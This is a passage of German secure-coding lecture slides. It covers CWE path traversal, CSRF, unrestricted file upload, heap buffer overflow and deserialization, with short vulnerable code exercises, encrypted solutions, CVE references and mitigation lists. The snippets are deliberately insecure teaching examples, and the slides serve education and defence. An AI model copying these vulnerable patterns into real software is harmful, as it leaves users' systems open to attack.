MTAwMDAw:3gLPQVazZ7o85d1CvoxRmknte7FJZUYQY86EMgPRK1Y=:TRfF4DOpFs1c1lI+:Rhl6mGetzdneOEI8FGmzsftQGEoWhumMYuGZJU/gyjjDzg8WysCDgXMqE7AjeuxdHned12QRY5hmiFIoqjBsbSvHNlQQ92MCQ60qyhfybxbziZO8a5CmjcQC94qhlh0L8jdLEYwMB1lKltuskw1f1rusT1RAGnHpgTZ/Hnuj9aiNxWwyNtFPz/odPCfgtvsFzPOW3g==</div>
</div>
</ld-card><ld-card class="incremental">
<div class="ld-exercise" data-exercise-id="17" data-exercise-title="17 - Path Traversal aufgrund partieller Validierung" id="ld-exercise-17">
<p class="ld-exercise-title rubric"><em>Path Traversal</em> aufgrund partieller Validierung</p>
<div class="compound">
<p><strong>Perl</strong></p>
<pre class="code Perl literal-block"><small class="ln">1 </small><code data-lineno="1 "><span class="keyword">my</span><span class="whitespace"> </span><span class="name variable">$Username</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="name">GetUntrustedInput</span><span class="punctuation">();</span><span class="whitespace">
</span></code><small class="ln">2 </small><code data-lineno="2 "><span class="whitespace"></span><span class="name variable">$Username</span><span class="whitespace"> </span><span class="operator">=~</span><span class="whitespace"> </span><span class="literal string regex">s/\.\.\///</span><span class="punctuation">;</span><span class="whitespace">                </span><span class="comment single"># Remove ../</span><span class="whitespace">
</span></code><small class="ln">3 </small><code data-lineno="3 "><span class="whitespace"></span><span class="keyword">my</span><span class="whitespace"> </span><span class="name variable">$filename</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="literal string">&quot;/home/user/&quot;</span><span class="whitespace"> </span><span class="operator">.</span><span class="whitespace"> </span><span class="name variable">$Username</span><span class="punctuation">;</span><span class="whitespace">
</span></code><small class="ln">4 </small><code data-lineno="4 "><span class="whitespace"></span><span class="name">ReadAndSendFile</span><span class="punctuation">(</span><span class="name variable">$filename</span><span class="punctuation">);</span></code></pre>
</div>
<div class="incremental compound">
<p><strong>Java</strong></p>
<pre class="code java literal-block"><small class="ln">1 </small><code data-lineno="1 "><span class="name">String</span><span class="whitespace"> </span><span class="name">path</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="name">getInputPath</span><span class="punctuation">();</span><span class="whitespace">
</span></code><small class="ln">2 </small><code data-lineno="2 "><span class="whitespace"></span><span class="keyword">if</span><span class="whitespace"> </span><span class="punctuation">(</span><span class="name">path</span><span class="punctuation">.</span><span class="name attribute">startsWith</span><span class="punctuation">(</span><span class="literal string">&quot;/safe_dir/&quot;</span><span class="punctuation">))</span><span class="whitespace"> </span><span class="punctuation">{</span><span class="whitespace">
</span></code><small class="ln">3 </small><code data-lineno="3 "><span class="whitespace">    </span><span class="name">File</span><span class="whitespace"> </span><span class="name">f</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="keyword">new</span><span class="whitespace"> </span><span class="name">File</span><span class="punctuation">(</span><span class="name">path</span><span class="punctuation">);</span><span class="whitespace">
</span></code><small class="ln">4 </small><code data-lineno="4 "><span class="whitespace">    </span><span class="name">f</span><span class="punctuation">.</span><span class="name attribute">delete</span><span class="punctuation">()</span><span class="whitespace">
</span></code><small class="ln">5 </small><code data-lineno="5 "><span class="whitespace"></span><span class="punctuation">}</span></code></pre>
</div>
<div class="ld-exercise-solution" data-encrypted="true">
MTAwMDAw:8uTO0iLAU3gPyyhD1rOrlbO3fjLmTmLKc4c6Ag0LzbM=:PJH17Y1yzg2GPXQN:iXe3y7P3dMuwWDksP30EwkCYbivXY3qFK0F90JO4wzaAwMSOAsvjkBpclOajrlybXAsyVJAE2wGu5wYZet+fZ+Hg4moW+SqY3jOpS+5M3fwHZk1Bm0fLn1PWXiZGEuCElXZcUfU88UZWevMOlqlNfn427O11S4LkFfXJFwLNdNpRHIsEmfZk1aqg9jLD/PO47okDqwVhnSTPLm/PJJE09EBt1MPESCqW+LC0Ed3sG9hyQ5nxfZivolnK0pRNGtuerNJ0aLBMHg0Ufn4runaOQOLTRfQjoCavrti2OOskMZVAaMnZaD9VNlYcCWIRcyV8Zv5rOwZh4+zc3GS9QmpBYC4VRtQAQQHeNJPpMFyOCcsCp9vxCSTZikU0DWfltzefIoJm9fZvRAWwPhXeGnAkA6ZYH+DEpLMNG7YtP5g1m2tiV6+ysJpyb4J0M6PClzRkY1pEelzZhI4apkpB+407FESULTciwADthbGIfTgvf9fZ6KajRSOoYoYdVkKKVtwSECLmf9RCjlGOiwiA1UzaQCS5Oore6gn8fPJMPfpxxVS1uqMV//d3WwcWi51KFjGR/wgWIlyBYb3lLuhwNbbiQ3yNM7DAfmobFBODj92wFtIfittPnX6C7SBCzpmjfDM8qEI6kHX12CQ1WXVoxZqmkD9SaWZc0SlKy4u1+58GxDmK3swecrCd2iDRPwBrL8qDZAlJRMEMBXBQaJLKZCHkF5CkQApUYeQbmpqeNNJQlHI8SATbsBU2pCredkXGgkb6EMoWyS57AB17LxSVNWKdakiZ78f/QyU7JnkPVEWYNaLBCn3n+W9v3t940IX5wbWBpFUf4mAOjVWQ99BgmjAxIwjGm3oLWDQa8BK+mQnfmoQPVdgVagPVS+PDnvG2kERVpwKAtkG5G45R0gD2KV7JPmQPQdtEfMhcQWB3/Os9DAkXP0vE7EObtkqObJWcacE4mg==</div>
</div>
</ld-card><ld-card class="incremental">
<p class="rubric">Schwachstellen leichtgemacht: verwirrende Python API<a class="brackets" href="#footnote-2" id="footnote-reference-2" role="doc-noteref"><span class="fn-bracket">[</span>2<span class="fn-bracket">]</span></a></p>
<ld-grid class="default-layout">
<ld-cell style="align-self:auto;">
<pre class="code Python literal-block"><small class="ln"> 1 </small><code data-lineno=" 1 "><span class="keyword namespace">import</span><span class="whitespace"> </span><span class="name namespace">os</span><span class="whitespace">
</span></code><small class="ln"> 2 </small><code data-lineno=" 2 "><span class="whitespace"></span><span class="keyword namespace">import</span><span class="whitespace"> </span><span class="name namespace">sys</span><span class="whitespace">
</span></code><small class="ln"> 3 </small><code data-lineno=" 3 "><span class="whitespace"></span><span class="keyword">def</span><span class="whitespace"> </span><span class="name function">main</span><span class="punctuation">():</span><span class="whitespace">
</span></code><small class="ln"> 4 </small><code data-lineno=" 4 "><span class="whitespace"></span><span class="name">filename</span> <span class="operator">=</span> <span class="name">sys</span><span class="operator">.</span><span class="name">argv</span><span class="punctuation">[</span><span class="literal number integer">1</span><span class="punctuation">]</span><span class="whitespace">
</span></code><small class="ln"> 5 </small><code data-lineno=" 5 "><span class="whitespace"></span><span class="name">path</span> <span class="operator">=</span> <span class="name">os</span><span class="operator">.</span><span class="name">path</span><span class="operator">.</span><span class="name">join</span><span class="punctuation">(</span><span class="name">os</span><span class="operator">.</span><span class="name">getcwd</span><span class="punctuation">(),</span><span class="whitespace">
</span></code><small class="ln"> 6 </small><code data-lineno=" 6 "><span class="whitespace"></span>                    <span class="name">filename</span><span class="punctuation">)</span><span class="whitespace">
</span></code><small class="ln"> 7 </small><code data-lineno=" 7 "><span class="whitespace"></span><span class="keyword">try</span><span class="punctuation">:</span><span class="whitespace">
</span></code><small class="ln"> 8 </small><code data-lineno=" 8 "><span class="whitespace"></span>    <span class="keyword">with</span> <span class="name builtin">open</span><span class="punctuation">(</span><span class="name">path</span><span class="punctuation">,</span> <span class="literal string single">'r'</span><span class="punctuation">)</span> <span class="keyword">as</span> <span class="name">f</span><span class="punctuation">:</span><span class="whitespace">
</span></code><small class="ln"> 9 </small><code data-lineno=" 9 "><span class="whitespace"></span>    <span class="name">file_data</span> <span class="operator">=</span> <span class="name">f</span><span class="operator">.</span><span class="name">read</span><span class="punctuation">()</span><span class="whitespace">
</span></code><small class="ln">10 </small><code data-lineno="10 "><span class="whitespace"></span><span class="keyword">except</span> <span class="name exception">FileNotFoundError</span> <span class="keyword">as</span> <span class="name">e</span><span class="punctuation">:</span><span class="whitespace">
</span></code><small class="ln">11 </small><code data-lineno="11 "><span class="whitespace"></span>    <span class="name builtin">print</span><span class="punctuation">(</span><span class="literal string double">&quot;Error - file not found&quot;</span><span class="punctuation">)</span><span class="whitespace">
</span></code><small class="ln">12 </small><code data-lineno="12 "><span class="whitespace">
</span></code><small class="ln">13 </small><code data-lineno="13 "><span class="whitespace"></span><span class="comment single"># do something with file_data</span></code></pre>
</ld-cell><ld-cell class="incremental" style="align-self:auto;">
<blockquote class="epigraph">
<p><strong>Dokumentation os.path.join</strong></p>
<p>Join one or more path components intelli- gently. The return value is the concatenation of path and any members of *paths with ex- actly one directory separator following each non-empty part except the last, meaning that the result will only end in a separator if the last part is empty.                     <em>If a component is an absolute path [...], all previous components are thrown away and joining continues from the absolute path component.</em></p>
<p class="attribution">—<a class="reference external" href="https://docs.python.org/3.11/library/os.path.html#os.path.join">Python 3.11.7</a></p>
</blockquote>
</ld-cell></ld-grid><aside class="footnote-list brackets">
<aside class="footnote brackets" id="footnote-2" role="doc-footnote">
<span class="label"><span class="fn-bracket">[</span><a role="doc-backlink" href="#footnote-reference-2">2</a><span class="fn-bracket">]</span></span>
<p>Verwirrende APIs gibt es in praktischen allen Sprachen!</p>
</aside>
</aside>
</ld-card><ld-card class="incremental">
<p class="rubric">Abhilfemaßnahmen und Erkennung</p>
<ul class="incremental-list simple">
<li><p>Eingabe vollständig validieren; zum Beispiel über kanonische Pfade</p></li>
<li><p>Sandboxen</p></li>
<li><p>Umgebung härten</p></li>
<li><p>Bei Fehlerausgaben darauf achten, dass keine Informationen über das Dateisystem preisgegeben werden</p></li>
<li><p>den Code mit minimalen Rechten ausführen</p></li>
</ul>
</ld-card></ld-deck></ld-topic>
<ld-topic class="new-subsection transition-move-to-top" id="cwe-352-cross-site-request-forgery-csrf">
<h2>CWE-352: Cross-Site Request Forgery (<em>CSRF</em>)</h2>
<div class="section-subtitle docutils container">
<p class="rubric">CWE Rank</p>
<table class="booktabs table-data-align-left table-header-align-left" style="width: 100%;">
<colgroup>
<col style="width: 40.0%" />
<col style="width: 60.0%" />
</colgroup>
<thead>
<tr><th class="head"><p>Jahr</p></th>
<th class="head"><p>Position</p></th>
</tr>
</thead>
<tbody>
<tr><td><p>2024</p></td>
<td><p>#4</p></td>
</tr>
<tr><td><p>2023</p></td>
<td><p>#9</p></td>
</tr>
</tbody>
</table>
</div>
</ld-topic>
<ld-topic id="cwe-352-cross-site-request-forgery">
<h2>CWE-352: Cross-Site Request Forgery</h2>
<ld-deck>
<ld-card>
<dl class="field-list">
<dt>Kurze Beschreibung<span class="colon">:</span></dt>
<dd><p>Die Webanwendung prüft nicht bzw. kann nicht prüfen, ob eine Anfrage absichtlich von dem Benutzer gestellt wurde, von dessen Browser sie übermittelt wurde.</p>
<p>D. h. eine CSRF Schwachstelle nutzt das Vertrauen aus, das eine Webseite in den Browser eines Nutzers hat. Bei einem CSRF-Angriff wird ein legitimer Nutzer von einem Angreifer dazu gebracht, ohne sein Wissen eine Anfrage zu übermitteln, die er nicht beabsichtigt hat und auch nicht bemerkt.</p>
</dd>
<dt>Missbrauchswahrscheinlichkeit<span class="colon">:</span></dt>
<dd><p>Mittel</p>
</dd>
<dt>Auswirkung<span class="colon">:</span></dt>
<dd><p>Hängt von den Nutzerrechten ab</p>
</dd>
<dt>Ausmaß<span class="colon">:</span></dt>
<dd><p>Vertraulichkeit, Integrität, Verfügbarkeit</p>
</dd>
</dl>
</ld-card><ld-card class="incremental">
<p class="rubric">Ursprüngliche Form</p>
<object aria-label="Cross-Site Request Forgery (CSRF) - ursprüngliche Form" data="images/csrf.svg" role="img" type="image/svg+xml">
</object><div class="supplemental docutils container">
<p class="rubric">Hintergrundwissen</p>
<p>Ursprünglich (d. h. für Cookies ohne modernes SameSite Attribut) war es so, dass ein Browser, immer wenn auf einen Seite zugegriffen wurde (z. B. mittels POST/GET Requests oder Fetch Zugriffe), dieser alle aktuellen Cookies bzgl. der Zieldomain mitgesendet hat. Dies galt unabhängig vom Browsertab/der Website aus dem der Zugriff heraus erfolgte. Dies konnte eine Angreiferwebseite im Rahmen von Cross-Site Request Forgery Attacken ausnutzen, um  authentifizierte Aktionen im Namen des Opfers auszuführen.</p>
</div>
</ld-card><ld-card class="incremental">
<p class="rubric">Cross-Site Request Forgery (CSRF) in 2023</p>
<blockquote class="epigraph">
<p>Fiber ist ein von Express inspiriertes Web-Framework, das in Go geschrieben wurde. In der Anwendung wurde eine Cross-Site Request Forgery (CSRF)-Schwachstelle entdeckt, die es einem Angreifer ermöglicht, beliebige Werte zu injizieren und bösartige Anfragen im Namen eines Benutzers zu fälschen. Diese Schwachstelle kann es einem Angreifer ermöglichen, beliebige Werte ohne Authentifizierung einzuschleusen oder verschiedene böswillige Aktionen im Namen eines authentifizierten Benutzers durchzuführen, wodurch die Sicherheit und Integrität der Anwendung gefährdet werden kann. Die Schwachstelle wird durch eine unsachgemäße Validierung und Durchsetzung von CSRF-Tokens innerhalb der Anwendung verursacht.</p>
<p class="attribution">—<a class="reference external" href="https://nvd.nist.gov/vuln/detail/CVE-2023-45128">CVE-2023-45128</a> (übersetzt mit DeepL)</p>
</blockquote>
<div class="supplemental docutils container">
<p class="rubric"><a class="reference external" href="https://nvd.nist.gov/vuln/detail/CVE-2023-45128">CVE-2023-45128</a></p>
<aside class="admonition remark">
<p class="admonition-title">Bemerkung</p>
<p>Identifizierte Schwachstellen: <em>CWE-20</em> Improper Input Validation, <em>CWE-807</em> Reliance on Untrusted Inputs in a Security Decision, <em>CWE-565</em> Reliance on Cookies without Validation and Integrity Checking, <em>CWE-352</em> Cross-Site Request Forgery</p>
</aside>
</div>
</ld-card><ld-card class="incremental">
<p class="rubric">Standardtechniken, die CSRF in 2023 verhindern <em>sollen</em></p>
<ul class="incremental-list simple">
<li><p>Same-site Cookies (für Authentifizierung)</p></li>
<li><p>CSRF-Tokens, wenn diese die folgenden Eigenschaften haben:</p>
<ul>
<li><p>Einmalig pro Nutzersession</p></li>
<li><p>Geheim</p></li>
<li><p>nicht vorhersagbar (z. B. eine sehr große, sicher erzeugte Zufallszahl)</p></li>
</ul>
</li>
<li><p>Validierung des Referer-Header</p></li>
<li><p>Custom Request Header, da diese nur vom JavaScript Code gesetzt werden können, der den gleichen Ursprung hat (siehe <em>Same Origin Policy</em> (SOP)).</p></li>
</ul>
<div class="incremental foundations docutils container">
<p>Auch diese Techniken lassen sich ggf. (alle zusammen) aushebeln, <a class="reference external" href="https://portswigger.net/web-security/csrf">wenn die Anwendung weitere Schwachstellen aufweist</a>. So gibt/gab es Anwendungen, die Anfragen, die nur über ein POST request gestellt werden sollten, auch bei einem GET akzeptiert haben.</p>
</div>
<div class="supplemental docutils container">
<p>In allen Browsern wird in der Zwischenzeit für Cookies die Same-site Policy angewandt mit dem Wert <code>Lax</code>. Dieser Wert hat zur Folge, dass Cookies nur dann gesendet werden, wenn der Nutzer explizit auf einen Link klickt oder sich innerhalb derselben Seite befindet.</p>
</div>
</ld-card></ld-deck></ld-topic>
<ld-topic class="new-subsection transition-move-to-top" id="cwe-434-unrestricted-upload-of-file-with-dangerous-type">
<h2>CWE-434: Unrestricted Upload of File with Dangerous Type</h2>
<div class="section-subtitle docutils container">
<p class="rubric">CWE Rank</p>
<table class="booktabs table-data-align-left table-header-align-left" style="width: 100%;">
<colgroup>
<col style="width: 40.0%" />
<col style="width: 60.0%" />
</colgroup>
<thead>
<tr><th class="head"><p>Jahr</p></th>
<th class="head"><p>Position</p></th>
</tr>
</thead>
<tbody>
<tr><td><p>2024</p></td>
<td><p>#10</p></td>
</tr>
<tr><td><p>2023</p></td>
<td><p>#10</p></td>
</tr>
</tbody>
</table>
</div>
</ld-topic>
<ld-topic id="cwe-434-unrestricted-upload-of-file-with-dangerous-type-1">
<h2>CWE-434: Unrestricted Upload of File with Dangerous Type</h2>
<ld-deck>
<ld-card>
<dl class="field-list simple">
<dt>Kurze Beschreibung<span class="colon">:</span></dt>
<dd><p>Es ist möglich potentiell gefährliche Dateien hochzuladen bzw. zu transferieren, die von der Anwendung automatisch im Kontext der Anwendung verarbeitet werden.</p>
</dd>
<dt>Missbrauchswahrscheinlichkeit<span class="colon">:</span></dt>
<dd><p>Mittel</p>
</dd>
<dt>Auswirkung<span class="colon">:</span></dt>
<dd><p>Bis hin zur Ausführung von beliebigen Befehlen</p>
</dd>
<dt>Ausmaß<span class="colon">:</span></dt>
<dd><p>Vertraulichkeit, Integrität, Verfügbarkeit</p>
</dd>
</dl>
</ld-card><ld-card class="incremental">
<div class="ld-exercise" data-exercise-id="18" data-exercise-title="18 - Unrestricted Uploads in PHP" id="ld-exercise-18">
<p class="ld-exercise-title rubric">Unrestricted Uploads in PHP</p>
<p>HTML:</p>
<pre class="code HTML literal-block"><small class="ln">1 </small><code data-lineno="1 "><span class="punctuation">&lt;</span><span class="name tag">form</span> <span class="name attribute">action</span><span class="operator">=</span><span class="literal string">&quot;upload_picture.php&quot;</span> <span class="name attribute">method</span><span class="operator">=</span><span class="literal string">&quot;post&quot;</span> <span class="name attribute">enctype</span><span class="operator">=</span><span class="literal string">&quot;multipart/form-data&quot;</span><span class="punctuation">&gt;</span>
</code><small class="ln">2 </small><code data-lineno="2 ">    Choose a file to upload:
</code><small class="ln">3 </small><code data-lineno="3 ">    <span class="punctuation">&lt;</span><span class="name tag">input</span> <span class="name attribute">type</span><span class="operator">=</span><span class="literal string">&quot;file&quot;</span> <span class="name attribute">name</span><span class="operator">=</span><span class="literal string">&quot;filename&quot;</span><span class="punctuation">/&gt;</span>
</code><small class="ln">4 </small><code data-lineno="4 ">    <span class="punctuation">&lt;</span><span class="name tag">br</span><span class="punctuation">/&gt;</span>
</code><small class="ln">5 </small><code data-lineno="5 ">    <span class="punctuation">&lt;</span><span class="name tag">input</span> <span class="name attribute">type</span><span class="operator">=</span><span class="literal string">&quot;submit&quot;</span> <span class="name attribute">name</span><span class="operator">=</span><span class="literal string">&quot;submit&quot;</span> <span class="name attribute">value</span><span class="operator">=</span><span class="literal string">&quot;Submit&quot;</span><span class="punctuation">/&gt;</span>
</code><small class="ln">6 </small><code data-lineno="6 "><span class="punctuation">&lt;/</span><span class="name tag">form</span><span class="punctuation">&gt;</span></code></pre>
<p>PHP:</p>
<pre class="code PHP literal-block"><small class="ln">1 </small><code data-lineno="1 "><span class="other">// Define the target location where the picture being
</span></code><small class="ln">2 </small><code data-lineno="2 "><span class="other">// uploaded is going to be saved.
</span></code><small class="ln">3 </small><code data-lineno="3 "><span class="other">$target = &quot;pictures/&quot; . basename($_FILES['uploadedfile']['name']);
</span></code><small class="ln">4 </small><code data-lineno="4 "><span class="other">
</span></code><small class="ln">5 </small><code data-lineno="5 "><span class="other">// Move the uploaded file to the new location.
</span></code><small class="ln">6 </small><code data-lineno="6 "><span class="other">move_uploaded_file($_FILES['uploadedfile']['tmp_name'], $target)</span></code></pre>
<div class="ld-exercise-solution" data-encrypted="true">
MTAwMDAw:g1i1kjJVutvi8JM4d5luymFCnmPvxTXsoWHZm1E3SnE=:0Zi/sCPwhPhf2uUJ:2f+Z6iJU9k00W5bXrQTvDDkf/EsMOIAxj2tAV5C6yjefXfryFYbpSlXdgdovAyCOnwgwT3FF3Eb8BKNeWbO2GVXhzYDeUehZEUVfILAemuBd8QmzK9TWrij+4xw4taKMkaK6PNwEQkxasuPc4P/Kg+ByRD9E2zt71jZb9I+4zhl6TMZlKEYVEZVPDxct/cTEUungoi4dlltlVszwyjxeO/SqReTqdO174UbRzoye+nKwq97l9oaq9SSk/gogvN7sh0Qw5RJ1XcxrEX4syIVW9q/rPOSj0jilRquaTAU+5nexJZtn+QYmlEWyUI+cUe7UcR09YFVf8f5SykJ35j8kqerZH4NsVVF9/j2Z0NPiXLU483fy2t9CPqsh0TRpNA0KHs49q0xuVDKirxA/yWjxLhdgRInagcN27Sg+FO3p2HTPpAhBlYn5sGsMPApKVkgSBenUmbKx2xyPrjliYwfabD6bBk5F523vtpctUDyjL9BOKuGffi0eNLG8iBi1Z88Oys3w2crAcYrI+Ex44vvpbYb15U9wcvwH1mlv3blLLZOKYAVTQ1nTrv7osaVJNFoM64QGztkktU1uYbYFvAJWq6jrA+7C7DXEyuq8Y4ThMHDvDS6CzhcP7nlRmBROKZgJGLpAtVGbhvTqhGIF6wFXQfXoP9OZDDnfYcjjtJKsThVXdSDBtiPBXeNXqgd2JwYrlx7fwzAhzm35Ay0GWbQydYjn/pJdIFxaDLo1Zv5/sTOB1NC3SESyYskIFftO2UOtWF93Ub4TInb/YEfA/K7YnUqDwsBAjO2EVTD2MxjRN1Unx0aSEgGp+HBo/FKP7YPsFXIe823eyVxxY76c4ottKREdaf/Q4gbnljI7q4KUD5FREixR8prmVP8H6ZpVrB46B02EeHQ3ioTtJbyrwbxW6rHh3En+Vwy7hHqxlqfMzZMQKTf8uokmu31RZryNWYIWHAfmU/kAb57g5JHIOv/pLsrSE2Zo2TxNDTNal8Nwh4efIZlNKqBHrhdBd582kvHkMgI1wW3L+pnvSDwE56k8S/DRyffNKy9hyo7ahV1XB+osOR5V7NSSbJ4TqLhRClkZ+ZMd4p21p99+ecoAI70H6LNukau9tusFMDcxGCcrqPkaU3aj2BFPs7iDqz2fk872EJEQpwF/sKopsi/UiRdHvX/vom/kp+mj72o4Sk3pp12hriEOwlCqIbG+f8qMIuGm7P/AomIWYQW1hrdjCWG5IIKjgfbGsBCMN5Y=</div>
</div>
</ld-card><ld-card class="incremental">
<p class="rubric">Abhilfemaßnahmen und Erkennung</p>
<ul class="incremental-list simple">
<li><p>Beim Speichern von Dateien niemals den ursprünglichen Dateinamen verwenden sondern einen vom Server generierten.</p></li>
<li><p>Speicher die Daten nicht im Kontext der Webanwendung sondern außerhalb des Webroots.</p></li>
<li><p>Prüfe die Dateiendung. Prüfe den Inhalt der Datei gegen die Erwartung.</p></li>
<li><p>Ausführen der Webanwendung mit minimalen Rechten.</p></li>
<li><p>Sandbox.</p></li>
</ul>
</ld-card></ld-deck></ld-topic>
<ld-topic class="new-subsection transition-move-to-top" id="cwe-122-heap-based-buffer-overflow">
<h2>CWE-122: Heap-based Buffer Overflow</h2>
<div class="section-subtitle docutils container">
<p class="rubric">CWE Rank</p>
<table class="booktabs table-data-align-left table-header-align-left" style="width: 100%;">
<colgroup>
<col style="width: 40.0%" />
<col style="width: 30.0%" />
<col style="width: 30.0%" />
</colgroup>
<thead>
<tr><th class="head"><p>Jahr</p></th>
<th class="head"><p>Position in CWE</p></th>
<th class="head"><p>Position in KEV</p></th>
</tr>
</thead>
<tbody>
<tr><td><p>2024</p></td>
<td><p>(Nicht in den Top 25)</p></td>
<td><p>(Nicht in den Top 10)</p></td>
</tr>
<tr><td><p>2023</p></td>
<td><p>(Nicht in den Top 25)</p></td>
<td><p>#2</p></td>
</tr>
</tbody>
</table>
</div>
</ld-topic>
<ld-topic id="cwe-122-heap-based-buffer-overflow-1">
<h2>CWE-122: Heap-based Buffer Overflow</h2>
<ld-deck>
<ld-card>
<dl class="field-list simple">
<dt>Kurze Beschreibung<span class="colon">:</span></dt>
<dd><p>Ein Pufferüberlauf, bei dem der Puffer, der überschrieben wird, auf dem Heap alloziiert wurde, was im Allgemeinen bedeutet, dass der Puffer mit einer Routine wie <code class="c"><span class="name">malloc</span><span class="punctuation">()</span></code> allloziiert wurde.</p>
</dd>
<dt>Missbrauchswahrscheinlichkeit<span class="colon">:</span></dt>
<dd><p>Hoch</p>
</dd>
<dt>Sprachen<span class="colon">:</span></dt>
<dd><p>C/C++</p>
</dd>
<dt>Auswirkung<span class="colon">:</span></dt>
<dd><p>Bis hin zur Ausführung von beliebigen Befehlen</p>
</dd>
<dt>Ausmaß<span class="colon">:</span></dt>
<dd><p>Vertraulichkeit, Integrität, Verfügbarkeit, Zugriffskontrolle</p>
</dd>
</dl>
</ld-card><ld-card class="incremental">
<div class="ld-exercise" data-exercise-id="19" data-exercise-title="19 - Heap-based Buffer Overflow: „Basisbeispiel“ in C" id="ld-exercise-19">
<p class="ld-exercise-title rubric">Heap-based Buffer Overflow: „Basisbeispiel“ in C</p>
<pre class="code C literal-block"><small class="ln">1 </small><code data-lineno="1 "><span class="comment preproc">#define BUFSIZE 256
</span></code><small class="ln">2 </small><code data-lineno="2 "><span class="comment preproc"></span><span class="keyword type">int</span><span class="whitespace"> </span><span class="name function">main</span><span class="punctuation">(</span><span class="keyword type">int</span><span class="whitespace"> </span><span class="name">argc</span><span class="punctuation">,</span><span class="whitespace"> </span><span class="keyword type">char</span><span class="whitespace"> </span><span class="operator">**</span><span class="name">argv</span><span class="punctuation">)</span><span class="whitespace"> </span><span class="punctuation">{</span><span class="whitespace">
</span></code><small class="ln">3 </small><code data-lineno="3 "><span class="whitespace">    </span><span class="keyword type">char</span><span class="whitespace"> </span><span class="operator">*</span><span class="name">buf</span><span class="punctuation">;</span><span class="whitespace">
</span></code><small class="ln">4 </small><code data-lineno="4 "><span class="whitespace">    </span><span class="name">buf</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="punctuation">(</span><span class="keyword type">char</span><span class="whitespace"> </span><span class="operator">*</span><span class="punctuation">)</span><span class="name">malloc</span><span class="punctuation">(</span><span class="keyword">sizeof</span><span class="punctuation">(</span><span class="keyword type">char</span><span class="punctuation">)</span><span class="operator">*</span><span class="name">BUFSIZE</span><span class="punctuation">);</span><span class="whitespace">
</span></code><small class="ln">5 </small><code data-lineno="5 "><span class="whitespace">    </span><span class="name">strcpy</span><span class="punctuation">(</span><span class="name">buf</span><span class="punctuation">,</span><span class="whitespace"> </span><span class="name">argv</span><span class="punctuation">[</span><span class="literal number integer">1</span><span class="punctuation">]);</span><span class="whitespace">
</span></code><small class="ln">6 </small><code data-lineno="6 "><span class="whitespace"></span><span class="punctuation">}</span></code></pre>
<div class="ld-exercise-solution" data-encrypted="true">
MTAwMDAw:5C3qGBts9U25W/jEis19+hhn93ro4MAUEnohFOL79WM=:EoNiHdiKyDSIh8HQ:HfgwfTqaE/+3MS/5yg0qKyl4PoG0XUnqrPcVKBxFmc3COltV8gyV48lxDF2vFQZT0wWfEBZupR2vHnIV0AFoQA7WKzQCMJg/IjZzAMobZiXxjSj2pVTB50XCmjrW4vS92BVwAwgiMflDz/zNcXLZoUFDssnzlurBMh4M2QkRNgJHT3So5Bmd1Tdy2wbmKkuM93l7ZQ==</div>
</div>
</ld-card><ld-card class="incremental">
<p class="rubric">Abhilfemaßnahmen und Erkennung</p>
<ul class="simple">
<li><p>Verwendung einer sicheren Programmiersprache</p></li>
<li><p>Verwendung von sicheren APIs</p></li>
<li><p>Kompilierung unter Verwendung entsprechender Schutzmechanismen (Position-Independent Executables (PIE), Canaries, ...)</p></li>
<li><p>Härtung der Umgebung (z. B. ASLR)</p></li>
<li><p>Statische Analyse Werkzeuge</p></li>
<li><p>Fuzzing</p></li>
</ul>
</ld-card></ld-deck></ld-topic>
<ld-topic class="new-subsection transition-move-to-top" id="cwe-502-deserialization-of-untrusted-data">
<h2>CWE-502: Deserialization of Untrusted Data</h2>
<div class="section-subtitle docutils container">
<p class="rubric">CWE Rank</p>
<table class="booktabs table-data-align-left table-header-align-left" style="width: 100%;">
<colgroup>
<col style="width: 40.0%" />
<col style="width: 30.0%" />
<col style="width: 30.0%" />
</colgroup>
<thead>
<tr><th class="head"><p>Jahr</p></th>
<th class="head"><p>Position in CWE</p></th>
<th class="head"><p>Position in KEV</p></th>
</tr>
</thead>
<tbody>
<tr><td><p>2024</p></td>
<td><p>16</p></td>
<td><p><a class="reference external" href="https://cwe.mitre.org/top25/archive/2024/2024_kev_list.html">#5</a></p></td>
</tr>
<tr><td><p>2023</p></td>
<td><p>15</p></td>
<td><p><a class="reference external" href="https://cwe.mitre.org/top25/archive/2023/2023_kev_list.html">#6</a></p></td>
</tr>
</tbody>
</table>
</div>
</ld-topic>
<ld-topic id="cwe-502-deserialization-of-untrusted-data-1">
<h2>CWE-502: Deserialization of Untrusted Data</h2>
<ld-deck>
<ld-card>
<dl class="field-list simple">
<dt>Kurze Beschreibung<span class="colon">:</span></dt>
<dd><p>Nicht vertrauenswürdige Daten werden deserialisiert ohne - <em>je nach Bibliothek notwendige vorhergehende</em> - Prüfung, dass die Daten die erwarteten Eigenschaften haben.</p>
</dd>
<dt>Missbrauchswahrscheinlichkeit<span class="colon">:</span></dt>
<dd><p>Mittel</p>
</dd>
<dt>Sprachen<span class="colon">:</span></dt>
<dd><p>Java, Ruby, Python, PHP, JavaScript, ...</p>
</dd>
<dt>Ausmaß<span class="colon">:</span></dt>
<dd><p>Insbesondere: Integrität und Verfügbarkeit (DoS); weitere Effekte sind vom Kontext abhängig.</p>
</dd>
<dt>Alternative Begriffe<span class="colon">:</span></dt>
<dd><p>(Un-)Marshalling, (Un-)Pickling</p>
</dd>
</dl>
<div class="supplemental docutils container">
<p>Bei der Serialisierung werden programminterne Objekte so verpackt, dass die Daten extern gespeichert und/oder übertragen werden können. Die Deserialisierung kehrt diesen Prozess um.</p>
</div>
</ld-card><ld-card class="incremental">
<aside class="admonition example">
<p class="admonition-title">Beispiel</p>
<p>Java</p>
<pre class="code java literal-block"><small class="ln">1 </small><code data-lineno="1 "><span class="name">File</span><span class="whitespace"> </span><span class="name">file</span><span class="whitespace"> </span><span class="operator">=</span><span class="whitespace"> </span><span class="keyword">new</span><span class="whitespace"> </span><span class="name">File</span><span class="punctuation">(</span><span class="literal string">&quot;object.obj&quot;</span><span class="punctuation">);</span><span class="whitespace">
